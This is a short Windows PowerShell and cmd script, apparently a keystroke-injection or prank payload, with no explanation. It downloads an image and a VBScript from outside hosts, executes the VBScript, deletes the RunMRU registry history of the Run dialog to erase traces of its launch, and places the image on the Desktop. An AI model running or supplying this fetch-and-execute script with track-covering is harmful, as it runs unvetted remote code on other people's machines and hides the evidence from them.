(new-object System.Net.WebClient).Downloadfile("https://i.ytimg.com/vi/qyYHWkVWQ4o/maxresdefault.jpg","C:\temp\kb.jpg")
(new-object System.Net.WebClient).Downloadfile("https://raw.githubusercontent.com/calebpmiller/Files/master/kb.vbs","C:\temp\kb.vbs")
Start-Process -FilePath C:\temp\kb.vbs
cmd.exe
cmd /c "reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va  /f"
cmd /c move C:\temp\kb.jpg "%USERPROFILE%\Desktop\"
